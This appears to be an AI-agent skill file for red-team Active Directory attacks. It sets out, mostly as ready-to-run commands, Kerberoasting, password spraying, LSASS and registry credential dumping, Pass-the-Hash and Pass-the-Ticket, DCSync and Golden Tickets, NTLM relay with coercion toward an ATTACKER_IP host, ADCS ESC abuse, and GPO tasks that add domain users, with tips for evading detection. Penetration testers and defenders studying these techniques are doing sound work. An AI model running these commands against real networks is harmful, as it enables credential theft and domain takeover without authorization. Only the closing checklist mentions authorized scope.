---
name: active-directory
description: <!-- Copyright (c) 2026 defconxt. All rights reserved. -->
---

<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: active-directory
description: >-
  Active Directory attacks including Kerberoasting, AS-REP roasting, DCSync, Pass-the-Hash,
  Pass-the-Ticket, NTLM relay, coercion (PetitPotam/PrinterBug/DFSCoerce), ADCS ESC1-ESC8,
  BloodHound analysis, ACL/DACL abuse, GPO abuse, credential extraction, and Windows
  privilege escalation. Use when asked about AD exploitation, Windows domain attacks,
  Kerberos, or BloodHound.
domain: cybersecurity
subdomain: red-teaming
tags:
  - active-directory
  - kerberos
  - bloodhound
  - ntlm-relay
  - adcs
  - pass-the-hash
  - dcsync
  - lateral-movement
  - mimikatz
  - privilege-escalation
version: "1.1"
author: defconxt
license: AGPL-3.0
compatibility: Designed for Claude Code, GitHub Copilot, OpenAI Codex, Cursor, Gemini CLI, and any agentskills.io-compatible agent.
metadata:
  mitre-attack: ["T1558", "T1003", "T1550", "T1187", "T1021", "T1484"]
  nist-csf: ["PR.AC-4", "PR.AC-7", "DE.CM-1"]
---
# Red Team — Active Directory

## When to Use
Triggered when the operator asks about Active Directory attacks, Windows domain
exploitation, Kerberoasting, AS-REP roasting, Pass-the-Hash, Pass-the-Ticket,
DCSync, NTLM relay, coercion (PetitPotam, PrinterBug, DFSCoerce), ADCS ESC1-ESC10,
BloodHound, delegation abuse, ACL/DACL abuse, GPO abuse, credential extraction,
Mimikatz, LSASS, lateral movement, or domain privilege escalation.

## Quick Reference
- Kerberoast: `GetUserSPNs.py -request -dc-ip 10.0.0.1 DOMAIN/user -outputfile hashes.k5`
- AS-REP roast: `GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt`
- DCSync: `secretsdump.py -just-dc DOMAIN/admin@10.0.0.1 -outputfile dcsync`
- BloodHound collect: `bloodhound-python -u user -p pass -d domain.local -c all -ns 10.0.0.1`
- SharpHound: `SharpHound.exe --CollectionMethods Group,LocalAdmin,Session,Trusts,ACL`
- PtH: `pth-winexe -U DOMAIN/admin%aad3b435:NTHASH //10.0.0.1 cmd.exe`
- PtH (impacket): `wmiexec.py -hashes :NTHASH DOMAIN/admin@10.0.0.1`
- ADCS ESC1: `certipy find -u user@domain -p pass -dc-ip 10.0.0.1` → `certipy req -ca CA -template ESC1 -upn admin@domain`
- NTLM relay: `ntlmrelayx.py -t ldap://DC --delegate-access --no-smb-server`
- Coerce (PetitPotam): `Petitpotam.py -d DOMAIN -u user -p pass ATTACKER_IP DC_IP`
- pypykatz LSASS dump: `pypykatz lsa minidump lsass.dmp`
- PrivescCheck: `Invoke-PrivescCheck -Extended -Report report`
- Crack RC4 (Kerberoast): `hashcat -m 13100 hashes.k5 rockyou.txt`

## Workflow

### Enumeration and Initial Reconnaissance

SMB null session check (unauthenticated):
```bash
netexec smb 10.0.0.0/24 -u '' -p '' --shares
rpcclient -U "" -N 10.0.0.1 -c "enumdomusers;enumdomgroups"
enum4linux-ng -A 10.0.0.1
```

LDAP enumeration (authenticated):
```bash
ldapsearch -H ldap://10.0.0.1 -x -D "user@domain" -w "pass" \
  -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName memberOf
# NetExec LDAP queries
netexec ldap 10.0.0.1 -u user -p pass --active-users
netexec ldap 10.0.0.1 -u user -p pass --password-not-required
netexec ldap 10.0.0.1 -u user -p pass --kerberoast hashes.txt
netexec ldap 10.0.0.1 -u user -p pass --asreproast asrep.txt
```

Password spraying (low-and-slow):
```bash
kerbrute passwordspray -d domain.local --dc 10.0.0.1 users.txt 'Winter2024!'
netexec smb 10.0.0.1 -u users.txt -p 'Winter2024!' --continue-on-success
# One attempt per account; check lockout policy first: lockoutThreshold, lockoutObservationWindow
```

**Anti-pattern:** Password spraying without checking lockout policy first — pull `Get-ADDefaultDomainPasswordPolicy` or enumerate via LDAP before spraying.

### Kerberos Attacks

Kerberoasting (T1558.003):
```bash
# Linux — Impacket
GetUserSPNs.py -request -dc-ip 10.0.0.1 DOMAIN/user -outputfile hashes.kerberoast
# Target specific account
GetUserSPNs.py -request-user svc_mssql -dc-ip 10.0.0.1 DOMAIN/user
# Windows — Rubeus
Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap /outfile:hashes.txt
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4   # RC4 only (where AES not enforced)
# Crack
hashcat -m 13100 hashes.rc4 rockyou.txt    # RC4 ($krb5tgs$23$)
hashcat -m 19700 hashes.aes256 rockyou.txt # AES256 ($krb5tgs$18$)
```

Targeted kerberoast (GenericWrite/GenericAll on user):
```bash
# Add temp SPN, roast, remove SPN
Set-DomainObject -Identity target -Set @{serviceprincipalname='fake/temp'} -Verbose
Rubeus.exe kerberoast /user:target /nowrap /rc4
Set-DomainObject -Identity target -Clear serviceprincipalname -Verbose
# Or automated: targetedKerberoast.py -d DOMAIN -u writer -p pass
```

AS-REP Roasting (T1558.004):
```bash
GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
# No-cred variant: kerbrute userenum users.txt -d domain --dc 10.0.0.1
```

**Anti-pattern:** Kerberoasting every SPN at once — Event ID 4769 fires per request. Target high-value accounts (MSSQLSvc, admincount=1) first; use `/delay` and `/jitter` in Rubeus.

### Credential Extraction and Lateral Movement

LSASS dump (T1003.001):
```bash
# Task Manager → Details → lsass.exe → Create dump file (GUI)
# Mimikatz
privilege::debug
sekurlsa::logonpasswords    # extract plaintext passwords, NTLM hashes, Kerberos tickets
sekurlsa::wdigest           # legacy: force WDigest to cache plaintext (requires reg change)
# Remote via pypykatz (Python, no AV footprint)
pypykatz lsa minidump lsass.dmp
# Comsvcs.dll method (LOLBin)
tasklist /fi "imagename eq lsass.exe"  # get PID
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full
```

Registry credential extraction:
```bash
# SAM + SYSTEM + SECURITY hives → local hashes
reg save HKLM\SAM sam.hive && reg save HKLM\SYSTEM system.hive && reg save HKLM\SECURITY security.hive
secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
```

Pass-the-Hash (PtH) (T1550.002):
```bash
# Impacket suite
wmiexec.py -hashes :NTHASH DOMAIN/admin@10.0.0.1
psexec.py -hashes :NTHASH DOMAIN/admin@10.0.0.1
smbexec.py -hashes :NTHASH DOMAIN/admin@10.0.0.1
netexec smb 10.0.0.1 -u admin -H NTHASH -x "whoami"
```

Pass-the-Ticket (PtT) (T1550.003):
```bash
# Export tickets (Mimikatz)
kerberos::list /export           # dump .kirbi files
# Import ticket
kerberos::ptt ticket.kirbi
# Linux: use ccache
KRB5CCNAME=/tmp/admin.ccache wmiexec.py -k -no-pass DOMAIN/admin@DC_FQDN
```

**Anti-pattern:** Using psexec.py as default lateral movement — creates a noisy service and drops a file. `wmiexec.py` (WMI, no file drop) and `smbexec.py` (no persistent service) are quieter.

### DCSync and Domain Credential Extraction

DCSync (T1003.006) — requires DS-Replication-Get-Changes + DS-Replication-Get-Changes-All:
```bash
# Remote (Impacket)
secretsdump.py -just-dc DOMAIN/admin@10.0.0.1 -outputfile dcsync_hashes
secretsdump.py -just-dc-user krbtgt DOMAIN/admin@10.0.0.1   # krbtgt only (golden ticket prep)
# Local (Mimikatz)
lsadump::dcsync /user:DOMAIN\krbtgt
lsadump::dcsync /domain:DOMAIN /all /csv
# Via captured DC TGT (from unconstrained delegation)
KRB5CCNAME=DC1$.ccache secretsdump.py -just-dc -k -no-pass DOMAIN/ -dc-ip 10.0.0.1
```

Grant DCSync rights to a user (persistence):
```powershell
Add-ObjectAcl -TargetDN "dc=domain,dc=local" -PrincipalSamAccountName backdoor \
  -Rights DCSync -Verbose  # PowerView
```

Golden Ticket (T1558.001):
```bash
# Requires: krbtgt NTLM hash, domain SID
mimikatz "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt"
```

**Anti-pattern:** DCSync without confirming permissions first — check who has replication rights with `Get-ObjectAcl -DN "dc=domain,dc=local" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "replication"}`.

### NTLM Relay and Coercion

Coercion techniques trigger inbound NTLM authentication from target machines:
```bash
# PetitPotam (MS-EFSR) — can trigger unauthenticated on some configs
Petitpotam.py -d DOMAIN -u user -p pass ATTACKER_IP DC_IP
# PrinterBug (MS-RPRN)
printerbug.py DOMAIN/user:pass@DC_IP ATTACKER_IP
# DFSCoerce (MS-DFSNM)
dfscoerce.py -d DOMAIN -u user -p pass ATTACKER_IP DC_IP
```

NTLM Relay with ntlmrelayx.py:
```bash
# Setup: disable SMB/HTTP signing on responder, run relay
Responder.py -I eth0 --lm -v              # poison LLMNR/NBT-NS
ntlmrelayx.py -t smb://10.0.0.1 -smb2support   # relay to SMB
ntlmrelayx.py -t ldap://DC_IP --delegate-access  # RBCD via LDAP relay
ntlmrelayx.py -t ldaps://DC_IP --add-computer MyCorp -computer-password 'Pass123!'
# IPv6 MITM (mitm6) → relay to LDAP(S)
mitm6 -d domain.local &
ntlmrelayx.py -6 -t ldaps://DC_IP --add-computer AttackerPC
```

**Anti-pattern:** Running Responder and ntlmrelayx simultaneously — Responder captures hashes; ntlmrelayx needs to receive and forward authentication. Use Responder for NBT-NS/LLMNR poisoning but disable SMB/HTTP in Responder.conf when relaying.

### ADCS (Active Directory Certificate Services) ESC1-ESC8

Enumerate ADCS:
```bash
certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -vulnerable  # Linux
Certify.exe find /vulnerable  # Windows
```

ESC1 — Misconfigured template (enrollee supplies SAN, Client Auth EKU, low-priv enrollment):
```bash
certipy req -u user@domain -p pass -target CA_IP -ca 'domain-CA' -template ESC1 -upn admin@domain.local
certipy auth -pfx admin.pfx -dc-ip 10.0.0.1  # authenticate as admin
```

ESC2 — Any Purpose or no EKU on template:
```bash
certipy req -template ESC2 ...  # cert usable for any purpose
```

ESC3 — Enrollment Agent template (enroll-on-behalf-of):
```bash
certipy req -template EnrollmentAgent ...  # get agent cert
certipy req -template User -on-behalf-of admin@domain -pfx agent.pfx  # issue cert as admin
```

ESC4 — Writable certificate template object (GenericWrite on template):
```bash
certipy template -u user@domain -p pass -template VulnTemplate -save-old  # backup
certipy template -template VulnTemplate -configuration VulnTemplate.json   # modify to ESC1
```

ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 set on CA (CA-wide flag allows SAN in any cert):
```bash
certipy req -template User -upn admin@domain.local  # set SAN even on User template
```

ESC8 — NTLM relay to HTTP enrollment endpoint (`/certsrv/certfnsh.asp`):
```bash
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp --adcs --template DomainController
# Trigger DC authentication → relay → issue DC certificate → PKINIT → TGT → DCSync
```

**Anti-pattern:** Only checking ESC1 — ESC8 is often misconfigured by default in environments that enabled HTTP enrollment without requiring Kerberos/HTTPS.

### BloodHound and ACL/GPO Abuse

BloodHound collection:
```bash
bloodhound-python -u user -p pass -d domain.local -c All -ns 10.0.0.1
# Stealth mode (LDAP only, no session enumeration)
SharpHound.exe --CollectionMethods Group,LocalAdmin,Trusts,ACL --Stealth
```

ACL/DACL abuse paths (from BloodHound edges):
- `GenericAll` / `GenericWrite` on user → targeted kerberoast, change password, add SPN
- `GenericWrite` on computer → RBCD attack
- `WriteDacl` on group → add self to group, inherit permissions
- `WriteOwner` on object → change owner, then add ACE
- `ForceChangePassword` → reset password without knowing current
- `Owns` → add WriteDACL, then GenericAll

```powershell
# PowerView ACL exploitation
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString -AsPlainText 'pass' -Force)
Add-DomainGroupMember -Identity 'Domain Admins' -Members attacker
Set-DomainObject -Identity target -Set @{scriptpath='\\attacker\share\evil.ps1'}
```

GPO abuse:
```powershell
# Enumerate GPOs with write rights
Get-DomainGPO | Get-ObjectAcl | Where-Object {$_.ActiveDirectoryRights -match "Write"}
# Create/modify GPO for computer/user startup script
# SharpGPOAbuse: add immediate task, modify startup script
SharpGPOAbuse.exe --AddComputerTask --TaskName evil --Author DOMAIN\Admin --Command cmd.exe --Arguments '/c net user hacker P@ss /add /domain' --GPOName VulnGPO
```

**Anti-pattern:** Running BloodHound with `-c All` over a slow WAN link — use `-c DCOnly` first for AD objects, then `Session` separately from a machine on the same segment.

## Advanced Techniques

See `references/advanced-ad-attacks.md` for delegation abuse,
ACL attacks, and cross-forest trust exploitation.

## Verification

- [ ] All attack techniques tested within authorized scope
- [ ] Findings documented with evidence and MITRE ATT&CK mapping
- [ ] Cleanup completed — all artifacts removed
- [ ] Detection opportunities noted for blue team
